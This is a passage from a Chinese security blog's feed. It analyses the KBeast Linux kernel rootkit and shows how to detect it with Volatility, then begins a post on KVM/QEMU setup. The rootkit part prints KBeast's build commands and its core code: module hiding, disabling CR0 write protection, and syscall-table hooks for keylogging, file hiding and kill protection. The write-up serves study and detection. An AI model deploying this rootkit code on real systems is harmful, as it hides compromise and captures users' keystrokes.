&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;grep sys_call_table /boot/System.map-2.6.32-21-generic
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;显示的结果为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c0592150 R sys_call_table
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考&lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register#CR0&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CR0&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;write_cr0 (read_cr0 () &amp;amp; (~ 0x10000));
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0X03-Kbeast-使用&quot;&gt;&lt;a href=&quot;#0X03-Kbeast-使用&quot; class=&quot;headerlink&quot; title=&quot;0X03 Kbeast 使用&quot;&gt;&lt;/a&gt;0X03 Kbeast 使用&lt;/h3&gt;&lt;p&gt;下载&lt;a href=&quot;https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kbeast&lt;/a&gt;. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar xzf ipsecs-kbeast-v1.tar.gz
cd kbeast-v1
./setup build 1  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：&lt;br&gt;Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,&lt;br&gt;2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。&lt;/p&gt;
&lt;p&gt;成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/&lt;em&gt;h4x&lt;/em&gt;路径下，生成/usr/&lt;em&gt;h4x&lt;/em&gt;/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。&lt;/p&gt;
&lt;h3 id=&quot;0X04-Kbeast-核心&quot;&gt;&lt;a href=&quot;#0X04-Kbeast-核心&quot; class=&quot;headerlink&quot; title=&quot;0X04 Kbeast 核心&quot;&gt;&lt;/a&gt;0X04 Kbeast 核心&lt;/h3&gt;&lt;p&gt;Kbeast以LKM的方式存在，以下是其核心代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*init module insmod*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//Uncomment to hide this module&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  list_del_init(&amp;amp;__this_module.&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; tcp_seq_afinfo *my_afinfo = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//proc_net is disappeared in 2.6.32, use init_net.proc_net&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc_dir_entry *my_dir_entry = init_net.proc_net-&amp;gt;subdir;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  write_cr0 (read_cr0 () &amp;amp; (~ &lt;span class=&quot;number&quot;&gt;0x10000&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(_KEYLOG_)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_read=(void *)sys_call_table[__NR_read];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table[__NR_read]=h4x_read;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_write=(void *)sys_call_table[__NR_write];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table[__NR_write]=h4x_write;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; defined(__x86_64__)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_getdents=sys_call_table [__NR_getdents];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table [__NR_getdents]=h4x_getdents;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;elif&lt;/span&gt; defined(__i386__)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_getdents64=sys_call_table [__NR_getdents64];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table [__NR_getdents64]=h4x_getdents64;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;error&lt;/span&gt; Unsupported architecture&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_unlink = sys_call_table [__NR_unlink];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_unlink] = h4x_unlink;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_rmdir = sys_call_table [__NR_rmdir];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_rmdir] = h4x_rmdir;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_unlinkat = sys_call_table [__NR_unlinkat];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_unlinkat] = h4x_unlinkat;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_rename = sys_call_table [__NR_rename];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_rename] = h4x_rename;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_open = sys_call_table [__NR_open];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_open] = h4x_open;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_kill = sys_call_table [__NR_kill];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_kill] = h4x_kill;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_delete_module = sys_call_table [__NR_delete_module];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_delete_module] = h4x_delete_module;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  write_cr0 (read_cr0 () | &lt;span class=&quot;number&quot;&gt;0x10000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(my_dir_entry-&amp;gt;name, &lt;span class=&quot;string&quot;&gt;&quot;tcp&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    my_dir_entry = my_dir_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry-&amp;gt;data))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//seq_show is disappeared in 2.6.32, use seq_ops.show&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    old_tcp4_seq_show = my_afinfo-&amp;gt;seq_ops.show;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    my_afinfo-&amp;gt;seq_ops.show = h4x_tcp4_seq_show;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sys_call_table[__NR_read]=h4x_read; // log key
sys_call_table[__NR_write]=h4x_write; // fake output ps,pstree,top,lsof
sys_call_table [__NR_getdents]=h4x_getdents; //hide file and directory
sys_call_table [__NR_unlink] = h4x_unlink; //Don&amp;apos;t allow your file to be removed
sys_call_table [__NR_rmdir] = h4x_rmdir; //Don&amp;apos;t allow your directory to be removed
sys_call_table [__NR_unlinkat] = h4x_unlinkat; //Don&amp;apos;t allow your file and directory to be removed 
sys_call_table [__NR_rename] = h4x_rename; //Don&amp;apos;t allow your file to be renamed/moved
sys_call_table [__NR_open] = h4x_open; //Don&amp;apos;t allow your file to be overwrited
sys_call_table [__NR_kill] = h4x_kill; //Don&amp;apos;t allow your process to be killed
sys_call_table [__NR_delete_module] = h4x_delete_module;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0X05-Kbeast-Detection-Using-Libvmi-and-Volatility&quot;&gt;&lt;a href=&quot;#0X05-Kbeast-Detection-Using-Libvmi-and-Volatility&quot; class=&quot;headerlink&quot; title=&quot;0X05 Kbeast Detection Using Libvmi and Volatility&quot;&gt;&lt;/a&gt;0X05 Kbeast Detection Using Libvmi and Volatility&lt;/h3&gt;&lt;p&gt;检测之前，先按照 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt; 文章搭好环境。&lt;/p&gt;
&lt;p&gt;以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_chech_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd

Pid    Uid    Gid    Arguments 
2316   2      2      ./_h4x_bd

 python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd 

 Offset     Name                 Pid             Uid             Gid    DTB      Start Time
 0xf579e680 _h4x_bd              2316            2               2      0x357c5000 2016-04-01 21:41:29 UTC+0000


  python vol.py -l vmi://1004desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd 

 Name                 Pid             Uid 
 ._h4x_bd             2316            2 

 python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd 

  Offset             Name                           Pid      FD       Path
  0x00000000f579e680 _h4x_bd                            2316        1 /dev/pts/0
0x00000000f579e680 _h4x_bd                            2316        2 /dev/pts/0
0x00000000f579e680 _h4x_bd                            2316        3 socket:[11708]

python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd 


 linux_proc_maps


 Offset             Pid      Name                 Start              End         
       Flags       Pgoff Major  Minor  Inode      File Path




 0x00000000f579e680     2316 _h4x_bd                  0x0000000000adb000 0x0000000000adc000 ---      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
0x00000000f579e680     2316 _h4x_bd              0x0000000000adc000 0x0000000000ade000 r--      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
0x00000000f579e680     2316 _h4x_bd              0x0000000000ade000 0x0000000000adf000 rw-      0x155000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
0x00000000f579e680     2316 _h4x_bd              0x0000000000adf000 0x0000000000ae2000 rw-           0x0      0      0          0 
0x00000000f579e680     2316 _h4x_bd              0x0000000008048000 0x0000000008049000 r-x           0x0    251      1     136169 /usr/_h4x_/_h4x_bd
0x00000000f579e680     2316 _h4x_bd              0x0000000008049000 0x000000000804a000 r--        0x1000    251      1     136169 /usr/_h4x_/_h4x_bd
0x00000000f579e680     2316 _h4x_bd              0x000000000804a000 0x000000000804b000 rw-        0x2000    251      1     136169 /usr/_h4x_/_h4x_bd
0x00000000f579e680     2316 _h4x_bd              0x00000000b7875000 0x00000000b7876000 rw-           0x0      0      0          0 
0x00000000f579e680     2316 _h4x_bd              0x00000000b7884000 0x00000000b7886000 rw-           0x0      0      0          0 
0x00000000f579e680     2316 _h4x_bd              0x00000000bfd84000 0x00000000bfd99000 rw-           0x0      0      0          0 [stack]

  python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   

 Module Address Module Name             
 0xf805dae0 ipsecs_kbeast_v1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Checking for make : /usr/bin/make
Removing Kernel Module
Removing Compiled Kernel Module
Stoping Network Daemon
Removing Backdoor File
rm: cannot remove `./_h4x_bd&amp;apos;: Permission denied
Removing Installation Directory
rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o&amp;apos;:         Permission denied
rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko&amp;apos;:         Permission denied
rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod&amp;apos;: Permission     denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c&amp;apos;:         Permission denied
rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd&amp;apos;: Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c&amp;apos;:         Permission denied
rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1&amp;apos;:     Permission denied 
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;如转载本文请注明出处: &lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/u/2767520802?is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0X00 全文环境&lt;/li&gt;
&lt;li&gt;0X01 Kbeast 特性&lt;/li&gt;
&lt;li&gt;0X02 系统调用劫持基础&lt;/li&gt;
&lt;li&gt;0X03 Kbeast 使用&lt;/li&gt;
&lt;li&gt;0X04 Kbeast 核心&lt;/li&gt;
&lt;li&gt;0X05 Kbeast Detection &lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
      <category term="Rootkit" scheme="http://yoursite.com/tags/Rootkit/"/>
    
      <category term="Malware" scheme="http://yoursite.com/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>A Comprehensive Virtualized Enviroment Setup and Analysis</title>
    <link href="http://yoursite.com/blog/2016/03/30/virt-setup-analysis/"/>
    <id>http://yoursite.com/blog/2016/03/30/virt-setup-analysis/</id>
    <published>2016-03-31T02:17:12.000Z</published>
    <updated>2016-04-23T20:24:09.000Z</updated>
    
    <content type="html">&lt;p&gt;本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控。可根据自身需要阅读相关内容。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x00 全文环境 &lt;/li&gt;
&lt;li&gt;0x01 虚拟机创建KVM/QEMU &lt;/li&gt;
&lt;li&gt;0x02 虚拟机管理Libvirt&lt;/li&gt;
&lt;li&gt;0x03 虚拟机监控Libvmi&lt;/li&gt;
&lt;li&gt;0x04 虚拟机监控Volatility&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;0x00-全文环境&quot;&gt;&lt;a href=&quot;#0x00-全文环境&quot; class=&quot;headerlink&quot; title=&quot;0x00 全文环境&quot;&gt;&lt;/a&gt;0x00 全文环境&lt;/h3&gt;&lt;p&gt;Ubuntu12.04 + Kvm-kmod-3.8 + Qemu-kvm-1.1.2+ Libvirt 1.3.2 + Libvmi + Volatility &lt;/p&gt;
&lt;h3 id=&quot;Ox01-虚拟机创建KVM-QEMU&quot;&gt;&lt;a href=&quot;#Ox01-虚拟机创建KVM-QEMU&quot; class=&quot;headerlink&quot; title=&quot;Ox01 虚拟机创建KVM/QEMU&quot;&gt;&lt;/a&gt;Ox01 虚拟机创建KVM/QEMU&lt;/h3&gt;&lt;p&gt;Kvm需要CPU的支持（Intel VT 或者 AMD SVM)，在安装KVM之前，可先检查CPU是否支持硬件虚拟化技术。基于Intel的系统，可运行 ‘grep vmx /proc/cpuinfo’ 查看是否含有vmx的关键字，如果有，则表示支持；基于AMD的系统，可运行 ‘grep svm /proc/cpuinfo’ 查看是否含有svm的关键字。&lt;br&gt;另外，CPU若支持硬件虚拟化，还得确保BLOS开启了VT选项（有些厂商默认是禁用的，如thinkpad t450). 可以下载 cpu-checker 工具（apt-get install cpu-checker)，之后运行kvm-ok， 如果提示 kvm acceleration can not be used，则可能是blos禁用了kvm虚拟化，在blos设置中开启即可。&lt;/p&gt;
&lt;p&gt;可执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;modprobe kvm 
modprobe kvm_intel 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开启内核自带的kvm&lt;/p&gt;
&lt;p&gt;关于源码安装kvm-kmod以及qemu-kvm的详细过程可参考 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/01/01/kvm-qemu-bytalk/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt; 文章。kvm-kmod安装成功后，运行lsmod | grep kvm， 会显示两个module:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kvm_intel             137721  3 
kvm                   415549  1 kvm_intel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;qemu-kvm安装成功后会在/your-confiure-location/bin/qemu-system-x86_64等可执行文件。&lt;/p&gt;
&lt;p&gt;安装完KVM/QEMU后，创建虚拟机的时候，虚拟机的网络方式是比较关心的问题，KVM/QEMU有两种网络配置方式。&lt;/p&gt;
&lt;p&gt;其一，用户模式（User Networking): 即NAT方式，也是默认的网络模式。让虚拟机访问主机、互联网或本地网络上的资源的简单方法，但是不能从网络或其他的客户机访问客户机。既然无法访问客户机，那宿主机与客户机该如何传输文件呢？默认的，客户机得到的ip空间为10.0.2.0/24，宿主机提供了ip为10.0.2.2的地址让虚拟机访问。可以ssh到宿主机(10.0.2.2)，用scp来拷贝文件。&lt;/p&gt;
&lt;p&gt;其二，桥接模式（Bridge Networking): 这种模式允许客户机就像一台独立的主机一样拥有网络。这种方式要比用户网络复杂一些，但是设置好后客户机与互联网，客户机与主机之间的通信都很容易。桥接网络需要网卡支持，一般的有线网卡都支持，绝大部分的无线网卡都不支持。&lt;/p&gt;
